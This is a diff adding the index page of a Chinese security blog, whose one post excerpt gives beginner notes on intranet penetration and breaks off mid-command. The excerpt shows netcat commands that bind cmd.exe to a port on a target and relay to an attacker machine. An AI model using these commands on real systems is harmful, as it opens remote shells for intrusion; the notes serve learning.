@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>J47erry&#39;S BLOG | 杰歪</title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="header">
+    <a class="logo" href="/">J47erry&#39;S BLOG</a>
+    <ul class="nav">
+        
+        <li><a href="/">首页</a></li>
+        
+        <li><a href="/archives">归档</a></li>
+        
+        <li><a href="/about">关于</a></li>
+        
+    </ul>
+</div>
+                
+                <div class="post-list">
+    
+    <div class="post">
+        <a class="post-title" href="/2022/05/22/%E6%B5%85%E8%B0%88-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"># 浅谈|内网渗透</a>
+        <div class="post-except">
+            文章的内容比较全面，但是整体的内容没有深入和专精的点。仅供小白操作。
+0x00 前言接触安全数月有余，整理一下内网学习笔记，但依旧是小白，很多知识技能尚未覆盖。如有疏漏之处，还请师傅们斧正。
+0x01 内网穿透#nc内网穿透&#x2F;&#x2F;攻击机执行
+nc -lvp 3333
+
+&#x2F;&#x2F;目标机执行
+nc -lvp 3333 -e c:\windows\system32\cmd.exe
+
+&#x2F;&#x2F;中间机执行  
+ nc -v 攻击机ip 
+            <a class="read-more" href="/2022/05/22/%E6%B5%85%E8%B0%88-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> ... </a>
+        </div>
+        <div class="post-date">2022.05.22</div>
+    </div>
+    
+</div>
+
+                <div class="footer">
+    <span>Copyright © 2022 J47erry&#39;S BLOG</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這Li</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
